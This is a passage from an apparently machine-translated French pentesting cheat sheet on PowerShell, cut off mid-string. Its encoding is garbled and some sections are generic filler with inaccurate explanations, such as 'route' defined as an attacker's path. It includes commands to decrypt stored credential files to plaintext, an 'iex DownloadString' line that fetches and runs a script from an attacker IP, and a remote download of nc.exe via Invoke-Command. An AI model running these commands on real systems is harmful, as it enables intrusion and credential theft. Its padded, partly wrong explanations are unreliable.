Dans cet exemple, nous utilisons la commande `Get-SecureString` pour obtenir une cha√Æne s√©curis√©e √† partir du texte brut "MotDePasse". Ensuite, nous utilisons la m√©thode `SecureStringToBSTR` de la classe `Marshal` pour convertir la cha√Æne s√©curis√©e en un pointeur vers une cha√Æne BSTR. Enfin, nous utilisons la m√©thode `PtrToStringAuto` de la classe `Marshal` pour convertir le pointeur en texte brut.

Il est important de noter que cette conversion expose la cha√Æne en texte brut, ce qui peut pr√©senter un risque de s√©curit√©. Assurez-vous d'utiliser cette fonctionnalit√© avec pr√©caution et de supprimer toutes les traces du texte brut une fois que vous avez termin√© vos op√©rations.
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
Ou en analysant directement le formulaire XML :
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

Le mot "sudo" est une commande couramment utilis√©e dans les syst√®mes d'exploitation bas√©s sur Unix pour permettre √† un utilisateur d'ex√©cuter des commandes avec les privil√®ges d'un autre utilisateur, g√©n√©ralement l'utilisateur root. Cela permet aux administrateurs syst√®me de d√©l√©guer certaines t√¢ches √† des utilisateurs non privil√©gi√©s sans leur donner un acc√®s complet au compte root.

Dans le contexte du piratage √©thique, la commande sudo peut √™tre utilis√©e pour escalader les privil√®ges et obtenir un acc√®s plus √©lev√© √† un syst√®me. Les attaquants peuvent rechercher des vuln√©rabilit√©s dans la configuration sudo pour ex√©cuter des commandes avec des privil√®ges √©lev√©s et ainsi compromettre le syst√®me.

Il est important de noter que l'utilisation de la commande sudo doit √™tre effectu√©e de mani√®re responsable et l√©gale, dans le cadre d'un test de p√©n√©tration autoris√©. L'utilisation non autoris√©e de la commande sudo est ill√©gale et peut entra√Æner des cons√©quences juridiques graves.
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## Groupes

### Introduction

Dans Windows, les groupes sont utilis√©s pour organiser et g√©rer les utilisateurs et les ressources. Les groupes permettent de simplifier l'administration des autorisations et des privil√®ges en attribuant des droits √† un groupe plut√¥t qu'√† chaque utilisateur individuellement. Cela facilite √©galement la gestion des utilisateurs lorsqu'il est n√©cessaire de leur accorder ou de leur retirer des autorisations.

### Types de groupes

Il existe diff√©rents types de groupes dans Windows :

- **Groupes locaux** : Ces groupes sont sp√©cifiques √† un ordinateur et sont utilis√©s pour g√©rer les utilisateurs et les ressources locales sur cet ordinateur.
- **Groupes globaux** : Ces groupes sont utilis√©s pour g√©rer les utilisateurs et les ressources sur un domaine Windows. Ils peuvent √™tre utilis√©s pour attribuer des autorisations √† des ressources partag√©es sur plusieurs ordinateurs.
- **Groupes universels** : Ces groupes sont utilis√©s pour g√©rer les utilisateurs et les ressources sur plusieurs domaines Windows. Ils sont principalement utilis√©s dans les environnements de grande taille avec plusieurs domaines.

### Utilisation de PowerShell pour g√©rer les groupes

PowerShell est un outil puissant pour g√©rer les groupes dans Windows. Voici quelques commandes utiles pour travailler avec les groupes :

- `Get-LocalGroup` : Cette commande permet d'obtenir la liste des groupes locaux sur un ordinateur.
- `Get-ADGroup` : Cette commande permet d'obtenir la liste des groupes globaux ou universels dans un domaine Windows.
- `New-LocalGroup` : Cette commande permet de cr√©er un nouveau groupe local.
- `New-ADGroup` : Cette commande permet de cr√©er un nouveau groupe global ou universel dans un domaine Windows.
- `Add-LocalGroupMember` : Cette commande permet d'ajouter un utilisateur √† un groupe local.
- `Add-ADGroupMember` : Cette commande permet d'ajouter un utilisateur √† un groupe global ou universel dans un domaine Windows.
- `Remove-LocalGroupMember` : Cette commande permet de supprimer un utilisateur d'un groupe local.
- `Remove-ADGroupMember` : Cette commande permet de supprimer un utilisateur d'un groupe global ou universel dans un domaine Windows.

### Conclusion

La gestion des groupes est essentielle pour organiser et g√©rer efficacement les utilisateurs et les ressources dans un environnement Windows. PowerShell offre de puissantes fonctionnalit√©s pour travailler avec les groupes, ce qui facilite l'administration des autorisations et des privil√®ges. En utilisant les commandes PowerShell appropri√©es, vous pouvez cr√©er, modifier et supprimer des groupes, ainsi qu'ajouter ou supprimer des utilisateurs de ces groupes.
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## Presse-papiers

The clipboard is a temporary storage area in the computer's memory that allows you to copy and paste text, images, and other data between different applications. It is commonly used for tasks such as copying text from a document and pasting it into an email or copying an image from a website and pasting it into a document.

Le presse-papiers est une zone de stockage temporaire dans la m√©moire de l'ordinateur qui vous permet de copier et coller du texte, des images et d'autres donn√©es entre diff√©rentes applications. Il est couramment utilis√© pour des t√¢ches telles que la copie de texte √† partir d'un document et son collage dans un e-mail, ou la copie d'une image √† partir d'un site Web et son collage dans un document.

When you copy something to the clipboard, it remains there until you copy something else or restart your computer. This means that the data in the clipboard can be accessed by other applications running on your computer. While this feature is convenient for legitimate purposes, it can also be exploited by malicious actors to steal sensitive information.

Lorsque vous copiez quelque chose dans le presse-papiers, il y reste jusqu'√† ce que vous copiez autre chose ou que vous red√©marriez votre ordinateur. Cela signifie que les donn√©es du presse-papiers peuvent √™tre accessibles par d'autres applications en cours d'ex√©cution sur votre ordinateur. Bien que cette fonctionnalit√© soit pratique √† des fins l√©gitimes, elle peut √©galement √™tre exploit√©e par des acteurs malveillants pour voler des informations sensibles.

As a pentester, it is important to be aware of the potential risks associated with the clipboard and take steps to mitigate them. This includes being cautious when copying and pasting sensitive information, using secure applications that encrypt the data in the clipboard, and regularly clearing the clipboard to remove any sensitive data that may have been inadvertently copied.

En tant que pentester, il est important de prendre conscience des risques potentiels associ√©s au presse-papiers et de prendre des mesures pour les att√©nuer. Cela inclut la prudence lors de la copie et du collage d'informations sensibles, l'utilisation d'applications s√©curis√©es qui chiffrent les donn√©es dans le presse-papiers, et la suppression r√©guli√®re du presse-papiers pour supprimer toutes les donn√©es sensibles qui ont pu √™tre copi√©es par inadvertance.
```powershell
Get-Clipboard
```
## Processus

Un processus est une instance d'un programme en cours d'ex√©cution sur un syst√®me d'exploitation. Les processus sont essentiels pour ex√©cuter des t√¢ches et des programmes sur un ordinateur. Dans cet article, nous allons explorer quelques techniques PowerShell de base pour interagir avec les processus.

### Obtenir la liste des processus en cours d'ex√©cution

Pour obtenir la liste des processus en cours d'ex√©cution sur un syst√®me Windows, vous pouvez utiliser la commande `Get-Process`. Cette commande affiche les informations de base sur tous les processus en cours d'ex√©cution, y compris leur ID de processus (PID), leur nom et leur utilisation de la m√©moire.

```powershell
Get-Process
```

### Tuer un processus

Si vous souhaitez arr√™ter un processus sp√©cifique, vous pouvez utiliser la commande `Stop-Process` suivie de l'ID de processus (PID) du processus que vous souhaitez arr√™ter.

```powershell
Stop-Process -Id <PID>
```

### Lancer un nouveau processus

Pour lancer un nouveau processus √† partir de PowerShell, vous pouvez utiliser la commande `Start-Process` suivie du chemin d'acc√®s de l'ex√©cutable du programme que vous souhaitez lancer.

```powershell
Start-Process -FilePath <chemin d'acc√®s>
```

Vous pouvez √©galement sp√©cifier des arguments suppl√©mentaires pour le processus en utilisant le param√®tre `-ArgumentList`.

```powershell
Start-Process -FilePath <chemin d'acc√®s> -ArgumentList <arguments>
```

### Surveiller les modifications des processus

PowerShell offre √©galement la possibilit√© de surveiller les modifications des processus en utilisant la commande `Register-WmiEvent`. Cette commande vous permet de sp√©cifier un filtre pour surveiller les √©v√©nements li√©s aux processus, tels que la cr√©ation ou la fermeture d'un processus.

```powershell
Register-WmiEvent -Query "SELECT * FROM __InstanceOperationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'" -Action { <action> }
```

Dans l'exemple ci-dessus, vous devez remplacer `<action>` par le code que vous souhaitez ex√©cuter lorsque l'√©v√©nement se produit.

### Conclusion

Les processus sont un √©l√©ment essentiel de tout syst√®me d'exploitation. En utilisant PowerShell, vous pouvez interagir avec les processus en cours d'ex√©cution, les arr√™ter, en lancer de nouveaux et surveiller les modifications. Ces techniques de base vous permettront d'explorer et de contr√¥ler les processus sur un syst√®me Windows.
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## Services

Les services sont des programmes qui s'ex√©cutent en arri√®re-plan sur un syst√®me d'exploitation Windows. Ils fournissent des fonctionnalit√©s sp√©cifiques et peuvent √™tre configur√©s pour d√©marrer automatiquement au d√©marrage du syst√®me.

### Gestion des services avec PowerShell

PowerShell est un puissant langage de script et une interface en ligne de commande pour Windows. Il offre de nombreuses fonctionnalit√©s pour g√©rer les services, y compris la possibilit√© de d√©marrer, arr√™ter, suspendre et reprendre des services.

Voici quelques commandes PowerShell couramment utilis√©es pour g√©rer les services :

- `Get-Service` : Cette commande affiche la liste des services disponibles sur le syst√®me.
- `Start-Service` : Cette commande d√©marre un service sp√©cifi√©.
- `Stop-Service` : Cette commande arr√™te un service sp√©cifi√©.
- `Suspend-Service` : Cette commande suspend l'ex√©cution d'un service sp√©cifi√©.
- `Resume-Service` : Cette commande reprend l'ex√©cution d'un service sp√©cifi√©.

### Exemple d'utilisation

Voici un exemple d'utilisation de PowerShell pour d√©marrer le service "Windows Update" :

```powershell
Start-Service -Name "wuauserv"
```

Dans cet exemple, la commande `Start-Service` est utilis√©e pour d√©marrer le service "Windows Update" en utilisant son nom "wuauserv".

### Conclusion

PowerShell offre une puissante interface pour g√©rer les services sur un syst√®me d'exploitation Windows. En utilisant les commandes PowerShell appropri√©es, les pentesteurs peuvent facilement manipuler les services pour effectuer des tests de p√©n√©tration et renforcer la s√©curit√© des syst√®mes.
```
Get-Service
```
## Mot de passe √† partir d'une cha√Æne s√©curis√©e

To extract a password from a secure string in PowerShell, you can use the `ConvertFrom-SecureString` cmdlet. This cmdlet converts a secure string into an encrypted standard string representation. 

To retrieve the password, follow these steps:

1. Open a PowerShell session.
2. Create a secure string object by using the `Read-Host` cmdlet. For example:
   ```powershell
   $secureString = Read-Host -AsSecureString
   ```
3. Convert the secure string to a standard string representation by using the `ConvertFrom-SecureString` cmdlet. For example:
   ```powershell
   $encryptedString = $secureString | ConvertFrom-SecureString
   ```
4. Store the encrypted string in a file or a secure location for later use.

To use the password, follow these steps:

1. Open a PowerShell session.
2. Retrieve the encrypted string from the file or secure location.
3. Convert the encrypted string back to a secure string by using the `ConvertTo-SecureString` cmdlet. For example:
   ```powershell
   $secureString = $encryptedString | ConvertTo-SecureString
   ```
4. Use the secure string as needed, such as providing it as a parameter for authentication.

Remember to handle the encrypted string with care and ensure that it is stored securely to prevent unauthorized access to sensitive information.
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## T√¢ches planifi√©es

Scheduled tasks are a powerful feature in Windows that allow you to automate the execution of scripts or programs at specific times or intervals. As a pentester, understanding how to leverage scheduled tasks can be beneficial for persistence, privilege escalation, and lateral movement.

Les t√¢ches planifi√©es sont une fonctionnalit√© puissante de Windows qui vous permet d'automatiser l'ex√©cution de scripts ou de programmes √† des moments ou √† des intervalles sp√©cifiques. En tant que pentester, comprendre comment exploiter les t√¢ches planifi√©es peut √™tre b√©n√©fique pour la persistance, l'escalade des privil√®ges et le mouvement lat√©ral.

### Creating Scheduled Tasks

### Cr√©ation de t√¢ches planifi√©es

To create a scheduled task, you can use the `New-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to specify the script or program to be executed, the trigger that defines when the task should run, and other settings such as the user account under which the task should run.

Pour cr√©er une t√¢che planifi√©e, vous pouvez utiliser la commande `New-ScheduledTask` dans PowerShell. Cette commande vous permet de sp√©cifier le script ou le programme √† ex√©cuter, le d√©clencheur qui d√©finit quand la t√¢che doit s'ex√©cuter, et d'autres param√®tres tels que le compte utilisateur sous lequel la t√¢che doit s'ex√©cuter.

Here's an example of creating a scheduled task that runs a PowerShell script every day at 8:00 AM:

Voici un exemple de cr√©ation d'une t√¢che planifi√©e qui ex√©cute un script PowerShell tous les jours √† 8h00 du matin :

```powershell
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File C:\path\to\script.ps1'
$Trigger = New-ScheduledTaskTrigger -Daily -At 8am
$Settings = New-ScheduledTaskSettingsSet
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
Register-ScheduledTask -TaskName 'MyTask' -InputObject $Task
```

### Modifying Scheduled Tasks

### Modification des t√¢ches planifi√©es

Once a scheduled task is created, you can modify its properties using the `Set-ScheduledTask` cmdlet. This allows you to change the script or program to be executed, the trigger, the user account, and other settings.

Une fois qu'une t√¢che planifi√©e est cr√©√©e, vous pouvez modifier ses propri√©t√©s √† l'aide de la commande `Set-ScheduledTask`. Cela vous permet de modifier le script ou le programme √† ex√©cuter, le d√©clencheur, le compte utilisateur et d'autres param√®tres.

Here's an example of modifying a scheduled task to run a different PowerShell script:

Voici un exemple de modification d'une t√¢che planifi√©e pour ex√©cuter un autre script PowerShell :

```powershell
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File C:\path\to\new_script.ps1'
Set-ScheduledTask -TaskName 'MyTask' -Action $Action
```

### Deleting Scheduled Tasks

### Suppression des t√¢ches planifi√©es

To delete a scheduled task, you can use the `Unregister-ScheduledTask` cmdlet. This will remove the task from the Windows Task Scheduler.

Pour supprimer une t√¢che planifi√©e, vous pouvez utiliser la commande `Unregister-ScheduledTask`. Cela supprimera la t√¢che du Planificateur de t√¢ches Windows.

Here's an example of deleting a scheduled task:

Voici un exemple de suppression d'une t√¢che planifi√©e :

```powershell
Unregister-ScheduledTask -TaskName 'MyTask' -Confirm:$false
```

### Conclusion

### Conclusion

Scheduled tasks are a useful feature in Windows that can be leveraged by pentesters for various purposes. By understanding how to create, modify, and delete scheduled tasks using PowerShell, you can enhance your capabilities as a pentester.

Les t√¢ches planifi√©es sont une fonctionnalit√© utile de Windows qui peut √™tre exploit√©e par les pentesters √† diverses fins. En comprenant comment cr√©er, modifier et supprimer des t√¢ches planifi√©es √† l'aide de PowerShell, vous pouvez am√©liorer vos capacit√©s en tant que pentester.
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
### Interfaces

Les interfaces r√©seau sont des points de connexion physiques ou virtuels utilis√©s pour la communication entre un ordinateur et un r√©seau. Dans Windows, vous pouvez utiliser PowerShell pour g√©rer les interfaces r√©seau.

#### Obtenir la liste des interfaces r√©seau

Pour obtenir la liste des interfaces r√©seau sur un syst√®me Windows, vous pouvez utiliser la commande suivante :

```powershell
Get-NetAdapter
```

Cette commande affichera les informations sur toutes les interfaces r√©seau disponibles, telles que le nom, l'index, l'√©tat, l'adresse MAC, l'adresse IP, etc.

#### D√©sactiver une interface r√©seau

Pour d√©sactiver une interface r√©seau sp√©cifique, vous pouvez utiliser la commande suivante :

```powershell
Disable-NetAdapter -Name "Nom de l'interface"
```

Remplacez "Nom de l'interface" par le nom de l'interface que vous souhaitez d√©sactiver.

#### Activer une interface r√©seau

Pour activer une interface r√©seau sp√©cifique, vous pouvez utiliser la commande suivante :

```powershell
Enable-NetAdapter -Name "Nom de l'interface"
```

Remplacez "Nom de l'interface" par le nom de l'interface que vous souhaitez activer.

#### Changer l'adresse IP d'une interface r√©seau

Pour changer l'adresse IP d'une interface r√©seau sp√©cifique, vous pouvez utiliser la commande suivante :

```powershell
New-NetIPAddress -InterfaceAlias "Nom de l'interface" -IPAddress "Nouvelle adresse IP" -PrefixLength "Longueur du pr√©fixe"
```

Remplacez "Nom de l'interface" par le nom de l'interface dont vous souhaitez changer l'adresse IP, "Nouvelle adresse IP" par la nouvelle adresse IP que vous souhaitez attribuer et "Longueur du pr√©fixe" par la longueur du pr√©fixe de sous-r√©seau.

#### Changer la passerelle par d√©faut d'une interface r√©seau

Pour changer la passerelle par d√©faut d'une interface r√©seau sp√©cifique, vous pouvez utiliser la commande suivante :

```powershell
Set-NetIPInterface -InterfaceAlias "Nom de l'interface" -DefaultGateway "Nouvelle passerelle"
```

Remplacez "Nom de l'interface" par le nom de l'interface dont vous souhaitez changer la passerelle par d√©faut et "Nouvelle passerelle" par l'adresse IP de la nouvelle passerelle.

#### Changer le DNS d'une interface r√©seau

Pour changer les serveurs DNS d'une interface r√©seau sp√©cifique, vous pouvez utiliser la commande suivante :

```powershell
Set-DnsClientServerAddress -InterfaceAlias "Nom de l'interface" -ServerAddresses "Adresse DNS primaire", "Adresse DNS secondaire"
```

Remplacez "Nom de l'interface" par le nom de l'interface dont vous souhaitez changer les serveurs DNS, "Adresse DNS primaire" par l'adresse IP du serveur DNS primaire et "Adresse DNS secondaire" par l'adresse IP du serveur DNS secondaire.

#### Renommer une interface r√©seau

Pour renommer une interface r√©seau sp√©cifique, vous pouvez utiliser la commande suivante :

```powershell
Rename-NetAdapter -Name "Nom de l'interface" -NewName "Nouveau nom"
```

Remplacez "Nom de l'interface" par le nom de l'interface que vous souhaitez renommer et "Nouveau nom" par le nouveau nom que vous souhaitez attribuer √† l'interface.
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Pare-feu

A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware devices or as software running on a computer.

Un pare-feu est un dispositif de s√©curit√© r√©seau qui surveille et contr√¥le le trafic r√©seau entrant et sortant en fonction de r√®gles de s√©curit√© pr√©d√©termin√©es. Il agit comme une barri√®re entre un r√©seau interne de confiance et un r√©seau externe non fiable, tel que l'internet. Les pare-feu peuvent √™tre mis en ≈ìuvre sous forme de dispositifs mat√©riels ou de logiciels s'ex√©cutant sur un ordinateur.

Firewalls use various techniques to filter network traffic, such as packet filtering, stateful inspection, and application-level gateway. They can also provide additional security features like intrusion detection and prevention, virtual private network (VPN) support, and network address translation (NAT).

Les pare-feu utilisent diff√©rentes techniques pour filtrer le trafic r√©seau, telles que le filtrage de paquets, l'inspection de l'√©tat et la passerelle de niveau d'application. Ils peuvent √©galement fournir des fonctionnalit√©s de s√©curit√© suppl√©mentaires telles que la d√©tection et la pr√©vention des intrusions, le support des r√©seaux priv√©s virtuels (VPN) et la traduction d'adresses r√©seau (NAT).

Firewalls are an essential component of network security and are commonly used to protect against unauthorized access, malware, and other cyber threats. It is important to configure and maintain firewalls properly to ensure the security of a network.

Les pare-feu sont un composant essentiel de la s√©curit√© r√©seau et sont couramment utilis√©s pour se prot√©ger contre les acc√®s non autoris√©s, les logiciels malveillants et autres menaces cybern√©tiques. Il est important de configurer et de maintenir les pare-feu correctement pour garantir la s√©curit√© d'un r√©seau.
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### Route

La route est un concept essentiel dans le domaine du piratage. Il fait r√©f√©rence au chemin suivi par un attaquant pour acc√©der √† un syst√®me cible. L'objectif est de trouver la meilleure voie pour contourner les mesures de s√©curit√© et atteindre l'objectif souhait√©, que ce soit l'extraction de donn√©es sensibles, l'installation de logiciels malveillants ou toute autre action malveillante.

Lors de la planification d'une attaque, il est important de prendre en compte diff√©rents facteurs pour d√©terminer la meilleure route √† suivre. Cela peut inclure l'identification des vuln√©rabilit√©s du syst√®me cible, l'analyse des mesures de s√©curit√© en place, l'√©valuation des risques et la s√©lection des outils et techniques appropri√©s.

Une fois la route choisie, l'attaquant peut commencer √† ex√©cuter les √©tapes n√©cessaires pour atteindre son objectif. Cela peut impliquer l'exploitation de failles de s√©curit√©, l'utilisation de techniques d'ing√©nierie sociale, l'escalade de privil√®ges ou d'autres m√©thodes de piratage.

Il est important de noter que le piratage est ill√©gal et peut entra√Æner des cons√©quences graves. Les informations fournies ici sont uniquement √† des fins √©ducatives et doivent √™tre utilis√©es de mani√®re responsable et √©thique.
```powershell
route print
```
### ARP

L'Address Resolution Protocol (ARP) est un protocole de r√©solution d'adresses utilis√© pour associer une adresse IP √† une adresse MAC dans un r√©seau local. Il permet aux machines de communiquer entre elles en utilisant des adresses MAC, qui sont des identifiants uniques attribu√©s √† chaque carte r√©seau.

L'ARP fonctionne en envoyant des requ√™tes ARP pour demander l'adresse MAC correspondant √† une adresse IP sp√©cifique. Une fois que la correspondance est √©tablie, les machines peuvent communiquer directement en utilisant les adresses MAC.

Les attaquants peuvent exploiter les vuln√©rabilit√©s de l'ARP pour mener des attaques de type "man-in-the-middle" ou pour effectuer des attaques de d√©ni de service en saturant la table ARP d'une machine cible.

Il est important de s√©curiser les r√©seaux en mettant en place des mesures de protection contre les attaques ARP, telles que l'utilisation de commutateurs qui filtrent les paquets ARP suspects ou la configuration de r√®gles de pare-feu pour bloquer les paquets ARP malveillants.

En tant que pentester, il est essentiel de comprendre le fonctionnement de l'ARP et les diff√©rentes attaques qui peuvent √™tre men√©es en exploitant ses vuln√©rabilit√©s. Cela permet de tester la s√©curit√© des r√©seaux et de recommander des mesures de protection appropri√©es.
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### H√¥tes

The `hosts` file is a plain text file used by operating systems to map hostnames to IP addresses. It is commonly used to block or redirect certain websites or to override DNS settings. As a pentester, you can leverage the `hosts` file to redirect traffic to your own IP address for analysis or to bypass certain security measures.

To locate the `hosts` file on a Windows system, navigate to `C:\Windows\System32\drivers\etc`. The file is named `hosts` and has no file extension. To edit the file, you will need administrative privileges.

By modifying the `hosts` file, you can redirect traffic from a specific domain to a different IP address. For example, you can redirect `www.example.com` to `127.0.0.1` (localhost) by adding the following line to the `hosts` file:

```
127.0.0.1    www.example.com
```

This will cause any requests to `www.example.com` to be redirected to your local machine.

Keep in mind that changes to the `hosts` file only affect the local system and do not propagate to other devices on the network. Additionally, some antivirus software may monitor changes to the `hosts` file and revert them back to their original state.

As a pentester, you can use the `hosts` file to redirect traffic to your own IP address for analysis or to bypass certain security measures. However, it is important to use this technique responsibly and within the boundaries of the law.
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Ping

La commande `ping` est utilis√©e pour tester la connectivit√© r√©seau entre un h√¥te local et un h√¥te distant. Elle envoie des paquets ICMP (Internet Control Message Protocol) √† l'h√¥te distant et attend une r√©ponse. Cela permet de v√©rifier si l'h√¥te distant est accessible et de mesurer le temps de latence entre les deux h√¥tes.

Pour utiliser la commande `ping` dans PowerShell, vous pouvez utiliser la cmdlet `Test-Connection`. Voici un exemple d'utilisation :

```powershell
Test-Connection -ComputerName <nom_h√¥te> -Count <nombre_de_paquets>
```

- `<nom_h√¥te>` : sp√©cifie le nom ou l'adresse IP de l'h√¥te distant que vous souhaitez tester.
- `<nombre_de_paquets>` : sp√©cifie le nombre de paquets ICMP √† envoyer √† l'h√¥te distant.

La commande `Test-Connection` affiche les r√©sultats de la commande `ping`, y compris le temps de latence moyen, le pourcentage de perte de paquets et d'autres informations utiles.

Il est important de noter que la commande `ping` peut √™tre bloqu√©e par un pare-feu ou une configuration r√©seau restrictive. Dans de tels cas, il peut √™tre n√©cessaire d'utiliser d'autres techniques de test de connectivit√©.
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

Le protocole SNMP (Simple Network Management Protocol) est un protocole de gestion de r√©seau largement utilis√© pour superviser et g√©rer les p√©riph√©riques r√©seau tels que les routeurs, les commutateurs et les serveurs. Il permet aux administrateurs r√©seau de collecter des informations sur l'√©tat et les performances des p√©riph√©riques, ainsi que de configurer et de contr√¥ler √† distance ces p√©riph√©riques.

SNMP utilise un mod√®le client-serveur, o√π les p√©riph√©riques r√©seau agissent en tant que serveurs SNMP et les applications de gestion r√©seau agissent en tant que clients SNMP. Les clients SNMP envoient des requ√™tes aux serveurs SNMP pour obtenir des informations sp√©cifiques, telles que les statistiques de trafic, les erreurs de transmission, les temp√©ratures du mat√©riel, etc.

Les serveurs SNMP stockent ces informations dans une base de donn√©es appel√©e MIB (Management Information Base). La MIB est une structure hi√©rarchique qui organise les informations en diff√©rents groupes et objets. Chaque objet dans la MIB est identifi√© par un OID (Object Identifier) unique.

Les clients SNMP peuvent interroger les serveurs SNMP en utilisant des requ√™tes GET pour obtenir des informations sp√©cifiques sur les p√©riph√©riques. Ils peuvent √©galement utiliser des requ√™tes SET pour configurer les param√®tres des p√©riph√©riques, tels que les adresses IP, les seuils d'alerte, etc.

SNMP est un protocole puissant mais il peut √©galement pr√©senter des risques de s√©curit√© s'il est mal configur√©. Les attaquants peuvent exploiter des vuln√©rabilit√©s SNMP pour obtenir des informations sensibles sur le r√©seau, tels que les adresses IP, les noms d'utilisateur et les mots de passe. Il est donc important de s√©curiser correctement les serveurs SNMP en utilisant des mesures telles que la restriction des adresses IP autoris√©es, l'utilisation de mots de passe forts et la surveillance des journaux d'activit√© SNMP.
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **Conversion de la cha√Æne SDDL en un format lisible**
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA